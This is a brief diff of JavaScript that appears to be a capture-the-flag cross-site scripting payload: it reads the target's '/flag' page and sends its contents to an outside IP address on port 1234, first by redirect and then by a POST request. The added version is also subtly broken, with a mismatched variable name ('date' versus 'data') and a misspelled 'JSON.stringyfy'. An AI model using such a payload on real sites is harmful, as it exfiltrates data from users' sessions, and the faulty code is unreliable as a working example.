@@ -1,3 +1,11 @@
 fetch('/flag')
-  .then(resp => resp.text())
-  .then(data => location='http://18.202.227.123:1234/blah?='+(data));
+    .then(date => {
+        fetch('http://18.202.227.123:1234/fdsa?=', {
+            method: 'POST',
+            mode: 'cors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringyfy(data)
+        })
+    })
